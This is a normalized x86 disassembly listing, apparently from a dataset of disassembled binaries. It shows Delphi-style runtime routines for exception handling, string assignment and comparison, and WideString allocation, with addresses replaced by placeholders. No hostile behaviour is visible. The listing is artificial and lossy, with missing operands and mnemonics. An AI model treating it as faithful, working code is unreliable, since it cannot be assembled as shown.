mov bl [ edx ]
push eax
mov eax [ eax - 0x24 ]
test eax eax
jne r-xdata
mov di [ esi ]
add esi 0x6
mov eax [ eax ]
mov esi [ eax - 0x38 ]
test esi esi
je r-xdata
pop edx
jmp r-xdata
mov bl [ ecx + esi + 0x6 ]
xor bl [ ecx + edx ]
and bl 0xdf
jne r-xdata
lea esi [ ecx + esi + 0x7 ]
dec edi
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov bl [ edx ]
mov cl [ esi + 0x6 ]
jmp r-xdata
dec ecx
jne r-xdata
mov cl [ esi + 0x6 ]
cmp cl bl
je r-xdata
mov eax [ esi ]
pop edx
add eax edx
sub_40360c
push edx
push ecx
push ebx
test dl dl
jl r-xdata
xor edx edx
lea ecx [ esp + 0x10 ]
mov ebx [ fs : edx ]
mov [ ecx ] ebx
mov [ ecx + 0x8 ] ebp
mov [ ecx + 0x4 ] sub_403635
mov [ ecx + 0xc ] eax
mov [ fs : edx ] ecx
pop ebx
pop ecx
pop edx
retn
call [ eax - 0xc ]
sub_4036a0
cmp [ rw-data ] 0x0
je r-xdata
retn
push eax
push eax
push edx
push esp
push 0x2
push 0x0
push 0xeedfae4
call [ rw-data ]
add esp 0x8
pop eax
sub_4036dc
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push [ ebx + 0x4 ]
jmp r-xdata
push esp
push 0x1
push 0x0
push 0xeedfae0
call [ rw-data ]
add esp 0x4
pop eax
retn
sub_4036f0
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push ebx
jmp r-xdata
push esp
push 0x1
push 0x0
push 0xeedfae0
call [ rw-data ]
add esp 0x4
pop eax
retn
sub_403704
test ecx ecx
je r-xdata
retn
mov eax [ ecx + 0x1 ]
cmp [ ecx ] 0xe9
je r-xdata
add ecx 0x5
cmp [ ecx ] 0xeb
jne r-xdata
movsx eax al
inc ecx
inc ecx
jmp r-xdata
add ecx eax
sub_403724
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push edx
push ecx
call sub_403704
push ecx
push esp
push 0x1
push 0x0
push 0xeedfae1
call [ rw-data ]
pop ecx
pop ecx
pop edx
pop eax
sub_403788
mov eax [ esp + 0x4 ]
test [ eax + 0x4 ] 0x6
jne r-xdata
mov eax 0x1
retn
cmp [ eax ] 0xeedfade
mov edx [ eax + 0x18 ]
mov ecx [ eax + 0x14 ]
je r-xdata
cmp [ rw-data ] 0x1
jbe r-xdata
cld
call sub_4031dc
mov edx [ rw-data ]
test edx edx
je r-xdata
or [ eax + 0x4 ] 0x2
push ebx
xor ebx ebx
push esi
push edi
push ebp
mov ebx [ fs : ebx ]
push ebx
push eax
push edx
push ecx
mov edx [ esp + 0x28 ]
push 0x0
push eax
push r-xdata
push edx
call [ rw-data ]
mov edi [ esp + 0x28 ]
call sub_406064
push [ eax ]
mov [ eax ] esp
mov ebp [ edi + 0x8 ]
mov ebx [ edi + 0x4 ]
mov [ edi + 0x4 ] r-xdata
add ebx 0x5
call sub_4036f0
jmp ebx
cmp [ rw-data ] 0x0
ja r-xdata
call edx
test eax eax
je r-xdata
push eax
lea eax [ esp + 0x8 ]
push edx
push ecx
push eax
call UnhandledExceptionFilter
cmp eax 0x0
pop ecx
pop edx
pop eax
je r-xdata
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
cmp [ ecx ] 0xeefface
je r-xdata
mov edx eax
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0xc ]
call sub_4036a0
cmp [ rw-data ] 0x0
jbe r-xdata
cmp [ rw-data ] 0x0
ja r-xdata
lea ecx [ esp + 0x4 ]
push eax
push ecx
call UnhandledExceptionFilter
cmp eax 0x0
pop eax
je r-xdata
mov edx eax
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0xc ]
jmp r-xdata
sub_4038b4
mov eax [ esp + 0x4 ]
test [ eax + 0x4 ] 0x6
jne r-xdata
mov eax 0x1
retn
cmp [ eax ] 0xeedfade
je r-xdata
mov eax [ eax + 0x18 ]
mov eax [ eax ]
cld
call sub_4031dc
mov edx [ rw-data ]
test edx edx
je r-xdata
mov eax [ esp + 0x14 ]
cmp [ eax ] 0xeedfade
mov edx [ eax + 0x18 ]
mov ecx [ eax + 0x14 ]
je r-xdata
mov edi ebp
jmp r-xdata
call edx
test eax eax
jne r-xdata
cmp [ rw-data ] 0x1
jbe r-xdata
call [ rw-data ]
mov edx [ esp + 0x1c ]
call sub_4036a0
cmp [ rw-data ] 0x0
jbe r-xdata
mov eax [ eax ]
cmp eax edi
je r-xdata
mov edx [ esp + 0x8 ]
push ebx
push esi
push edi
push ebp
mov ecx [ edx + 0x4 ]
mov ebx [ ecx + 0x5 ]
lea esi [ ecx + 0x9 ]
mov ebp eax
jmp r-xdata
xor ebx ebx
mov ebx [ fs : ebx ]
push ebx
push eax
push edx
push ecx
mov edx [ esp + 0x28 ]
or [ eax + 0x4 ] 0x2
push esi
push 0x0
push eax
push r-xdata
push edx
call [ rw-data ]
pop ebx
mov edi [ esp + 0x28 ]
call sub_406064
push [ eax ]
mov [ eax ] esp
mov ebp [ edi + 0x8 ]
mov [ edi + 0x4 ] r-xdata
mov eax [ esp + 0x8 ]
call sub_4036dc
jmp [ ebx + 0x4 ]
cmp [ rw-data ] 0x0
ja r-xdata
mov edx eax
mov eax [ esp + 0x14 ]
mov ecx [ eax + 0xc ]
jmp r-xdata
cmp [ rw-data ] 0x0
ja r-xdata
mov ecx [ eax - 0x28 ]
cmp ecx [ edi - 0x28 ]
jne r-xdata
push eax
lea eax [ esp + 0x8 ]
push edx
push ecx
push eax
call UnhandledExceptionFilter
cmp eax 0x0
pop ecx
pop edx
pop eax
je r-xdata
lea ecx [ esp + 0x4 ]
push eax
push ecx
call UnhandledExceptionFilter
cmp eax 0x0
pop eax
je r-xdata
mov edi [ edi - 0x24 ]
mov eax [ esi ]
test edi edi
jne r-xdata
mov eax [ eax - 0x2c ]
mov edx [ edi - 0x2c ]
xor ecx ecx
mov cl [ eax ]
cmp cl [ edx ]
jne r-xdata
mov edi [ edi ]
add esi 0x8
dec ebx
jne r-xdata
inc eax
inc edx
call sub_402c4c
je r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
jmp r-xdata
sub_403a3c
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
test [ eax + 0x4 ] 0x6
je r-xdata
mov eax 0x1
retn
mov ecx [ edx + 0x4 ]
mov [ edx + 0x4 ] r-xdata
push ebx
push esi
push edi
push ebp
mov ebp [ edx + 0x8 ]
add ecx 0x5
call sub_403724
call ecx
pop ebp
pop edi
pop esi
pop ebx
sub_403a74
or eax eax
jne r-xdata
pop edx
push esp
push ebp
push edi
push esi
push ebx
push eax
push edx
push esp
push 0x7
push 0x1
push 0xeedfade
push edx
jmp [ rw-data ]
mov eax 0xd8
call sub_40402c
sub_403a9c
mov eax [ esp + 0x30 ]
mov [ eax + 0x4 ] r-xdata
call sub_406064
mov edx [ eax ]
mov ecx [ edx ]
mov [ eax ] ecx
mov eax [ edx + 0xc ]
and [ eax + 0x4 ] 0xfffffffd
cmp [ eax ] 0xeedfade
je r-xdata
xor eax eax
add esp 0x14
mov edx [ fs : eax ]
pop ecx
mov edx [ edx ]
mov [ ecx ] edx
pop ebp
pop edi
pop esi
pop ebx
mov eax 0x1
retn
mov eax [ edx + 0x8 ]
call sub_4032a8
call sub_403684
sub_403af0
call sub_406064
mov edx [ eax ]
mov ecx [ edx ]
mov [ eax ] ecx
mov eax [ edx + 0x8 ]
call sub_4032a8
pop edx
mov esp [ esp + 0x2c ]
xor eax eax
pop ecx
mov [ fs : eax ] ecx
pop eax
pop ebp
call sub_40374c
jmp edx
sub_403b38
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
cmp eax 0xc0000092
jg r-xdata
cmp eax 0xc0000096
jg r-xdata
je r-xdata
sub eax 0xc00000fd
je r-xdata
je r-xdata
mov al 0xcf
jmp r-xdata
cmp eax 0xc000008e
jg r-xdata
mov al 0xca
jmp r-xdata
sub eax 0x3d
je r-xdata
mov al 0xda
jmp r-xdata
sub eax 0xc0000093
je r-xdata
and eax 0xff
mov edx [ edx + 0xc ]
call sub_4027d0
add eax 0x3fffff71
sub eax 0x2
jb r-xdata
je r-xdata
mov al 0xd9
jmp r-xdata
jmp r-xdata
mov al 0xce
jmp r-xdata
dec eax
je r-xdata
je r-xdata
mov al 0xc8
jmp r-xdata
sub eax 0xc0000005
je r-xdata
mov al 0xff
mov al 0xc8
jmp r-xdata
dec eax
je r-xdata
mov al 0xcd
jmp r-xdata
jmp r-xdata
mov al 0xd8
jmp r-xdata
sub eax 0x87
je r-xdata
mov al 0xd7
jmp r-xdata
jmp r-xdata
mov al 0xc9
jmp r-xdata
dec eax
je r-xdata
jmp r-xdata
sub_403c98
xor edx edx
mov eax [ rw-data ]
test eax eax
je r-xdata
retn
mov ecx [ fs : edx ]
cmp eax ecx
jne r-xdata
cmp ecx 0xffffffff
je r-xdata
mov eax [ eax ]
mov [ fs : edx ] eax
retn
cmp [ ecx ] eax
jne r-xdata
mov ecx [ ecx ]
mov eax [ eax ]
mov [ ecx ] eax
sub_403cc0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi rw-data
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov ebx [ edi + 0xc ]
mov esi [ eax + 0x4 ]
xor edx edx
push ebp
push sub_403d06
push [ fs : edx ]
mov [ fs : edx ] esp
test ebx ebx
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
dec ebx
mov [ edi + 0xc ] ebx
mov eax [ esi + ebx * 8 + 0x4 ]
test eax eax
je r-xdata
test ebx ebx
jg r-xdata
call eax
sub_403d20
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ rw-data ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov esi [ eax ]
xor ebx ebx
mov edi [ eax + 0x4 ]
xor edx edx
push ebp
push sub_403d66
push [ fs : edx ]
mov [ fs : edx ] esp
cmp esi ebx
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ edi + ebx * 8 ]
inc ebx
mov [ rw-data ] ebx
test eax eax
je r-xdata
cmp esi ebx
jg r-xdata
call eax
sub_403dc0
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
add eax ebx
add edx ebx
call sub_405df8
add esi 0x8
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_403de4
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
mov eax [ eax + ebx ]
add edx ebx
call sub_405df8
add esi 0x8
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_403e0c
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
mov eax [ eax + ebx ]
add eax [ esi + 0x8 ]
mov [ edx + ebx ] eax
add esi 0xc
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_403e30
push ebx
push esi
push edi
mov esi rw-data
mov cl 0x10
mov ebx [ rw-data ]
mov eax ebx
mov edi 0xa
cdq
idiv edi
add dl 0x30
xor eax eax
mov al cl
mov [ esi + eax ] dl
mov eax ebx
mov ebx 0xa
cdq
idiv ebx
mov ebx eax
dec ecx
test ebx ebx
jne r-xdata
mov cl 0x1c
mov eax [ rw-data ]
mov edx eax
and edx 0xf
mov dl [ edx + rw-data ]
xor ebx ebx
mov bl cl
mov [ esi + ebx ] dl
shr eax 0x4
dec ecx
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
retn
sub_403e8c
xor eax eax
xchg [ rw-data ] eax
neg eax
sbb eax eax
inc eax
mov edi rw-data
mov ebx [ edi + 0x18 ]
mov ebp [ edi + 0x14 ]
push [ edi + 0x1c ]
push [ edi + 0x20 ]
mov esi [ edi ]
mov ecx 0xb
[ edi ] [ esi ]
pop edi
pop esi
leave
retn 0xc
sub_403ebc
push ecx
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0xd7b2
jne r-xdata
pop edx
retn
push 0x0
push rw-data
push rw-data
push 0x0
call sub_40123c
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x1e
push rw-data
push 0xfffffff5
call sub_401204
push eax
call sub_401224
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x2
push r-xdata
push 0xfffffff5
call sub_401204
push eax
call sub_401224
pop edx
retn
cmp [ rw-data ] 0x0
jbe r-xdata
mov eax rw-data
call [ rw-data ]
sub_403f48
push ebx
push esi
push edi
push ebp
mov ebx rw-data
mov esi rw-data
mov edi rw-data
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ edi ] 0x0
je r-xdata
cmp [ ebx + 0x28 ] 0x2
jne r-xdata
call sub_403e30
call sub_403ebc
xor eax eax
mov [ rw-data ] eax
mov edx [ edi ]
mov eax edx
xor edx edx
mov [ edi ] edx
mov ebp eax
call ebp
cmp [ edi ] 0x0
jne r-xdata
call sub_403cc0
cmp [ ebx + 0x28 ] 0x1
jbe r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov eax [ ebx + 0x10 ]
test eax eax
je r-xdata
cmp [ esi ] 0x0
je r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
call sub_403c98
cmp [ ebx + 0x28 ] 0x1
jne r-xdata
call sub_4058c4
mov edx [ ebx + 0x10 ]
mov eax [ edx + 0x10 ]
cmp eax [ edx + 0x4 ]
je r-xdata
cmp [ ebx + 0x28 ] 0x0
je r-xdata
call [ ebx + 0x24 ]
test eax eax
je r-xdata
cmp [ ebx ] 0x0
jne r-xdata
call sub_403e8c
push eax
call sub_401254
mov eax [ ebx ]
push esi
mov esi eax
mov edi ebx
mov ecx 0xb
[ edi ] [ esi ]
pop esi
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ esi ]
push eax
call ExitProcess
call [ rw-data ]
sub_404038
mov edx [ eax ]
test edx edx
je r-xdata
retn
mov [ eax ] 0x0
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
jne r-xdata
push eax
lea eax [ edx - 0x8 ]
call sub_4026ec
pop eax
sub_40405c
push ebx
push esi
mov ebx eax
mov esi edx
add ebx 0x4
dec esi
jne r-xdata
mov [ ebx ] 0x0
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
mov edx [ ebx ]
test edx edx
je r-xdata
pop esi
pop ebx
retn
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_4026ec
sub_40408c
test edx edx
je r-xdata
xchg [ eax ] edx
test edx edx
je r-xdata
mov ecx [ edx - 0x8 ]
inc ecx
jg r-xdata
retn
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
push eax
push edx
mov eax [ edx - 0x4 ]
call sub_4040fc
mov edx eax
pop eax
push edx
mov ecx [ eax - 0x4 ]
call sub_4028c8
pop edx
pop eax
jmp r-xdata
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_4026ec
sub_4040d0
test edx edx
je r-xdata
xchg [ eax ] edx
test edx edx
je r-xdata
mov ecx [ edx - 0x8 ]
inc ecx
jle r-xdata
retn
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_4026ec
sub_4040fc
test eax eax
jle r-xdata
xor eax eax
retn
push eax
add eax 0xa
and eax 0xfffffffe
push eax
call sub_4026cc
pop edx
mov [ edx + eax - 0x2 ] 0x0
add eax 0x8
pop edx
mov [ eax - 0x4 ] edx
mov [ eax - 0x8 ] 0x1
retn
sub_404128
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
mov eax edi
call sub_4040fc
mov ecx edi
mov edi eax
test esi esi
je r-xdata
mov eax ebx
call sub_404038
mov [ ebx ] edi
pop edi
pop esi
pop ebx
retn
mov edx eax
mov eax esi
call sub_4028c8
sub_404158
push ebp
mov ebp esp
push 0x0
push 0x0
push edx
push eax
mov eax [ ebp + 0x8 ]
push eax
push ecx
push 0x0
mov eax [ rw-data ]
push eax
call WideCharToMultiByte
pop ebp
retn 0x4
sub_404178
push ebp
mov ebp esp
push edx
push eax
mov eax [ ebp + 0x8 ]
push eax
push ecx
push 0x0
mov eax [ rw-data ]
push eax
call MultiByteToWideChar
pop ebp
retn 0x4
sub_404194
push ebx
push esi
push edi
push ebp
add esp 0xfffff004
push eax
add esp 0xfffffffc
mov esi ecx
mov [ esp ] edx
mov edi eax
test esi esi
jg r-xdata
lea ebp [ esi + 0x1 ]
cmp ebp 0x7ff
jge r-xdata
mov eax edi
call sub_404038
jmp r-xdata
mov ebx ebp
add ebx ebx
mov eax edi
mov edx ebx
call sub_404684
push esi
mov eax [ edi ]
mov ecx [ esp + 0x4 ]
mov edx ebx
call sub_404158
mov ebx eax
test ebx ebx
jge r-xdata
push esi
lea eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
mov edx 0xfff
call sub_404158
mov ebx eax
test ebx ebx
jl r-xdata
add esp 0x1004
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
mov edx ebx
call sub_404684
xor ebx ebx
lea edx [ esp + 0x4 ]
mov eax edi
mov ecx ebx
call sub_404128
jmp r-xdata
sub_404230
xor ecx ecx
test edx edx
je r-xdata
jmp sub_404128
push edx
mov ecx edx
pop edx
sub ecx edx
cmp cl [ edx + 0x1 ]
je r-xdata
inc edx
cmp cl [ edx + 0x2 ]
je r-xdata
inc edx
cmp cl [ edx + 0x3 ]
je r-xdata
inc edx
add edx 0x4
jmp r-xdata
cmp cl [ edx ]
je r-xdata
sub_404260
xor ecx ecx
test edx edx
je r-xdata
jmp sub_404194
push edx
mov ecx edx
pop edx
sub ecx edx
shr ecx 0x1
cmp cx [ edx + 0x2 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x4 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x6 ]
je r-xdata
add edx 0x2
add edx 0x8
jmp r-xdata
cmp cx [ edx ]
je r-xdata
sub_4042a8
push edi
push eax
push ecx
mov edi edx
xor eax eax
[ edi ]
jne r-xdata
pop eax
add ecx eax
pop eax
pop edi
jmp sub_404128
not ecx
sub_4042d4
push ebx
test edx edx
je r-xdata
mov [ eax ] 0x0
pop ebx
retn
mov ebx [ edx - 0x4 ]
test ebx ebx
je r-xdata
cmp ecx ebx
jl r-xdata
mov [ eax ] cl
inc eax
xchg edx eax
call sub_4028c8
pop ebx
retn
mov ecx ebx
sub_404300
test edx edx
je r-xdata
retn
mov ecx [ eax ]
test ecx ecx
je sub_40408c
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi [ ecx - 0x4 ]
mov edx [ esi - 0x4 ]
add edx edi
cmp esi ecx
je r-xdata
call sub_404684
mov eax [ ebx ]
mov ecx edi
jmp r-xdata
call sub_404684
mov eax esi
mov ecx [ esi - 0x4 ]
mov edx [ ebx ]
add edx edi
call sub_4028c8
pop edi
pop esi
pop ebx
retn
sub_404344
test edx edx
je r-xdata
mov edx ecx
jmp sub_40408c
test ecx ecx
je sub_40408c
cmp edx [ eax ]
je r-xdata
mov edx ecx
jmp sub_404300
cmp ecx [ eax ]
je r-xdata
push ebx
push esi
push edi
mov ebx edx
mov esi ecx
push eax
mov eax [ ebx - 0x4 ]
add eax [ esi - 0x4 ]
call sub_4040fc
mov edi eax
mov edx eax
mov eax ebx
mov ecx [ ebx - 0x4 ]
call sub_4028c8
mov edx edi
mov eax esi
mov ecx [ esi - 0x4 ]
add edx [ ebx - 0x4 ]
call sub_4028c8
pop eax
mov edx edi
test edi edi
je r-xdata
push eax
push ecx
call sub_40408c
pop edx
pop eax
jmp sub_404300
call sub_40408c
pop edi
pop esi
pop ebx
retn
dec [ edi - 0x8 ]
sub_4043b8
push ebx
push esi
push edi
push edx
push eax
mov ebx edx
xor edi edi
mov ecx [ esp + edx * 4 + 0x14 ]
test ecx ecx
je r-xdata
xor eax eax
cmp [ eax ] ecx
jne r-xdata
dec edx
jne r-xdata
add eax [ ecx - 0x4 ]
cmp edi ecx
jne r-xdata
mov edi ecx
mov eax [ ecx - 0x4 ]
dec edx
jmp r-xdata
mov ecx [ esp + edx * 4 + 0x14 ]
test ecx ecx
je r-xdata
test edi edi
je r-xdata
xor edi edi
call sub_4040fc
push eax
mov esi eax
mov edx eax
mov eax [ esp ]
mov esi [ edi - 0x4 ]
call sub_404684
mov edi [ esp ]
push [ edi ]
add esi [ edi ]
dec ebx
jmp r-xdata
dec ebx
jne r-xdata
mov ecx [ eax - 0x4 ]
add esi ecx
call sub_4028c8
mov eax [ esp + ebx * 4 + 0x18 ]
mov edx esi
test eax eax
je r-xdata
pop edx
pop eax
test edi edi
jne r-xdata
pop edx
pop edi
pop esi
pop ebx
pop eax
lea esp [ esp + edx * 4 ]
jmp eax
test edx edx
je r-xdata
call sub_40408c
dec [ edx - 0x8 ]
sub_404444
push ebx
push esi
push edi
mov esi eax
mov edi edx
cmp eax edx
je r-xdata
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edx [ edi - 0x4 ]
sub eax edx
jmp r-xdata
test edi edi
je r-xdata
mov eax [ esi - 0x4 ]
sub eax edx
jmp r-xdata
mov eax [ esi - 0x4 ]
mov edx [ edi - 0x4 ]
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x3
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp cl bl
jne r-xdata
pop edx
cmp cl bl
jne r-xdata
dec edx
je r-xdata
dec edx
je r-xdata
cmp ch bh
jne r-xdata
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
cmp ch bh
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
dec edx
je r-xdata
cmp ch bh
jmp r-xdata
and ebx 0xff0000
and ecx 0xff0000
cmp ecx ebx
jne r-xdata
sub_404504
mov edx [ eax ]
test edx edx
je r-xdata
mov eax edx
retn
mov ecx [ edx - 0x8 ]
dec ecx
je r-xdata
push ebx
mov ebx eax
mov eax [ edx - 0x4 ]
call sub_4040fc
mov edx eax
mov eax [ ebx ]
mov [ ebx ] edx
push eax
mov ecx [ eax - 0x4 ]
call sub_4028c8
pop eax
mov ecx [ eax - 0x8 ]
dec ecx
jl r-xdata
mov edx [ ebx ]
pop ebx
[ eax - 0x8 ]
jne r-xdata
lea eax [ eax - 0x8 ]
call sub_4026ec
sub_404558
push ebx
test eax eax
je r-xdata
mov eax [ esp + 0x8 ]
call sub_404038
mov ebx [ eax - 0x4 ]
test ebx ebx
je r-xdata
dec edx
jl r-xdata
xor edx edx
jmp r-xdata
cmp edx ebx
jge r-xdata
sub ebx edx
test ecx ecx
jl r-xdata
cmp ecx ebx
jg r-xdata
mov ecx ebx
jmp r-xdata
add edx eax
mov eax [ esp + 0x8 ]
call sub_404128
jmp r-xdata
pop ebx
retn 0x4
sub_404598
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
call j_sub_404504
mov edx [ ebx ]
test edx edx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx [ edx - 0x4 ]
dec esi
jl r-xdata
cmp esi ecx
jge r-xdata
test edi edi
jle r-xdata
sub ecx esi
cmp edi ecx
jle r-xdata
sub ecx edi
add edx esi
lea eax [ edi + edx ]
call sub_4028c8
mov edx [ ebx ]
mov eax ebx
mov edx [ edx - 0x4 ]
sub edx edi
call sub_404684
mov edi ecx
sub_4045e0
test eax eax
je r-xdata
retn
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
mov edi ecx
mov edx [ edx ]
push edx
test edx edx
je r-xdata
dec edi
jge r-xdata
mov edx [ edx - 0x4 ]
cmp edi edx
jle r-xdata
xor edi edi
mov ebp [ ebx - 0x4 ]
mov eax esi
add edx ebp
call sub_404684
pop eax
cmp eax ebx
jne r-xdata
mov edi edx
mov eax [ esi ]
lea edx [ edi + ebp ]
mov ecx [ eax - 0x4 ]
sub ecx edx
add edx eax
add eax edi
call sub_4028c8
mov eax ebx
mov edx [ esi ]
mov ecx ebp
add edx edi
call sub_4028c8
pop ebp
pop edi
pop esi
pop ebx
mov ebx [ esi ]
sub_40463c
test eax eax
je r-xdata
retn
test edx edx
je r-xdata
xor eax eax
retn
push ebx
push esi
push edi
mov esi eax
mov edi edx
mov ecx [ edi - 0x4 ]
push edi
mov edx [ esi - 0x4 ]
dec edx
js r-xdata
pop edx
xor eax eax
jmp r-xdata
mov al [ esi ]
inc esi
sub ecx edx
jle r-xdata
pop edi
pop esi
pop ebx
[ edi ]
jne r-xdata
mov ebx ecx
push esi
push edi
mov ecx edx
[ esi ] [ edi ]
pop edi
pop esi
je r-xdata
pop edx
mov eax edi
sub eax edx
mov ecx ebx
jmp r-xdata
sub_404684
push ebx
push esi
push edi
mov ebx eax
mov esi edx
xor edi edi
test edx edx
jle r-xdata
mov eax ebx
call sub_404038
mov [ ebx ] edi
mov eax [ ebx ]
test eax eax
je r-xdata
mov eax edx
call sub_4040fc
mov edi eax
mov eax [ ebx ]
test eax eax
je r-xdata
cmp [ eax - 0x8 ] 0x1
jne r-xdata
mov edx edi
mov ecx [ eax - 0x4 ]
cmp ecx esi
jl r-xdata
sub eax 0x8
add edx 0x9
push eax
mov eax esp
call sub_40270c
pop eax
add eax 0x8
mov [ ebx ] eax
mov [ eax - 0x4 ] esi
mov [ esi + eax ] 0x0
jmp r-xdata
call sub_4028c8
mov ecx esi
pop edi
pop esi
pop ebx
retn
sub_4046e8
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
mov eax ecx
call sub_404038
test esi esi
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_4040fc
mov [ edi ] eax
mov edx esi
mov cl bl
call sub_402cbc
sub_40475c
push ebx
push esi
mov ebx eax
mov esi edx
add ebx 0x4
dec esi
jne r-xdata
mov [ ebx ] 0x0
push eax
call SysFreeString
mov eax [ ebx ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
sub_404780
test edx edx
je sub_404744
mov ecx [ edx - 0x4 ]
shr ecx 0x1
je sub_404744
push ecx
push edx
push eax
call SysReAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_402828
retn
sub_4047a4
push ebx
push esi
push edi
push ebp
add esp 0xfffff004
push eax
add esp 0xfffffffc
mov esi ecx
mov [ esp ] edx
mov edi eax
test esi esi
jg r-xdata
lea ebp [ esi + 0x1 ]
cmp ebp 0x7ff
jge r-xdata
mov eax edi
call sub_404744
jmp r-xdata
mov ebx ebp
mov eax edi
mov edx ebx
call sub_40498c
push esi
mov eax [ edi ]
mov ecx [ esp + 0x4 ]
mov edx ebx
call sub_404178
mov ebx eax
test ebx ebx
jge r-xdata
push esi
lea eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
mov edx 0x7ff
call sub_404178
mov ebx eax
test ebx ebx
jle r-xdata
add esp 0x1004
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
mov edx ebx
call sub_40498c
xor ebx ebx
lea edx [ esp + 0x4 ]
mov eax edi
mov ecx ebx
call sub_404830
jmp r-xdata
sub_404830
test ecx ecx
je sub_404744
push eax
push ecx
push edx
call SysAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_402828
pop edx
push [ edx ]
mov [ edx ] eax
call SysFreeString
retn
sub_404854
xor ecx ecx
test edx edx
je r-xdata
jmp sub_404830
push edx
mov ecx edx
pop edx
sub ecx edx
shr ecx 0x1
cmp cx [ edx + 0x2 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x4 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x6 ]
je r-xdata
add edx 0x2
add edx 0x8
jmp r-xdata
cmp cx [ edx ]
je r-xdata
sub_4048bc
push ebx
push esi
push edi
mov esi eax
mov edi edx
cmp eax edx
je r-xdata
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edx [ edi - 0x4 ]
sub eax edx
jmp r-xdata
test edi edi
je r-xdata
mov eax [ esi - 0x4 ]
sub eax edx
jmp r-xdata
mov eax [ esi - 0x4 ]
mov edx [ edi - 0x4 ]
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x2
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov cx [ esi ]
mov bx [ edi ]
cmp cx bx
jne r-xdata
pop edx
cmp cx bx
jne r-xdata
dec edx
je r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cx bx
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
jmp r-xdata
sub_404940
push ebp
